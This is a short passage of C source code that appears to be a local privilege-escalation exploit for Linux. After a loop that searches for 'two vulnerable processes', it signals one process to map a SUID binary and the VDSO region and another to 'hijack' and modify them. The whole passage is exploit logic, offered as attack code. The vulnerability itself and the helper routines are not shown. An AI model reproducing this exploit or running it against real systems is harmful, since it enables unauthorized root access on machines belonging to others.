    SYSCHK(munmap(ptr, 0x200000));

    fprintf(stderr, "."); // Progress indicator

    /* Update calibration timing */
    update_calibration_timing(&pick_num_now, math_timeout);
  }

  /* We've found two vulnerable processes - begin exploitation */
  logd("Successfully found two vulnerable processes - PIDs: %d and %d", 
       corrupted_pids[HIJACK_PROCESS], corrupted_pids[VICTIM_PROCESS]);

  /* Trigger the exploit by signaling victim process to map SUID binary and VDSO region */
  logd("Initiating memory mapping...");
  kill(corrupted_pids[VICTIM_PROCESS], SIGUSR1);
  int wstatus;
  waitpid(corrupted_pids[VICTIM_PROCESS], &wstatus, 0);

  /* Signal the hijack process to modify the SUID binary and VDSO region */
  logd("Hijacking SUID binary and VDSO region...");
  kill(corrupted_pids[HIJACK_PROCESS], SIGUSR1);
  eternal_sleep();
}